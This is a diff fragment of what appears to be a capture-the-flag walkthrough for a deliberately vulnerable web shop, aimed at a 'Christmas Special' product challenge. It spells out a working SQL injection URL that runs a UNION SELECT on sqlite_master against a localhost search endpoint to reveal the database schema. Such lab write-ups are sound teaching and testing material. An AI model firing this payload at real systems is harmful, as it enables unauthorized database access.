@@ -2,6 +2,7 @@
 
 ## Steps
 Look for the Christmas Special Product (is the product name given on the challenge description)
+
 1. Go to the DB schema injection URL:
 localhost:3000/rest/products/search?q=')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master-- 
 2. Right Click then click Inspect Element
